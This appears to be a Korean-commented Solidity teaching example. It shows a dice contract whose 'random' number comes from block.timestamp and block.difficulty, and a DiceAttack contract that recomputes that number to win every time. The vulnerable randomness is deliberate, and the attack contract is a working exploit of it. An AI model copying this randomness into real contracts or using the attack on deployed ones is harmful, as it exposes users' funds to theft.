// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.1;

// ex) 랜덤값을 맞추는 유저에게 상금을 주는 컨트랙트

// chainlink를 사용하지 않을 때
contract Dice{
  constructor() payable{} // 배포 시 msg.value 할당
  receive() external payable{} // 외부에서 이더를 전송할 수 있게

  address private winner;

  // 랜덤값을 만들고 랜덤값을 맞춘 msg.sender를 winner로 할당
  function roll(uint8 dice_number) public payable{
    uint8 dice = uint8(uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty)))%251);

    if(dice_number == dice){
      winner = msg.sender;
    }
  }

  function getWinner() public view returns(address){
    return winner;
  }

}

interface IDice{
  function roll(uint8) external;
}

contract DiceAttack{
  // 같은 로직의 랜덤값을 생성해서 숫자를 맞춤
  function attack(address _address) public payable{
    uint8 answer = uint8(uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty)))%251);
    IDice(_address).roll(answer);
  }

  function withdraw(address payable _to) public{
    _to.transfer(address(this).balance);
  }
}




// onlyOwner또는 해싱할 때 임의의 상수를 넣으면 어느정도 막을 수 있는 것 같지만 넘어가도록 하자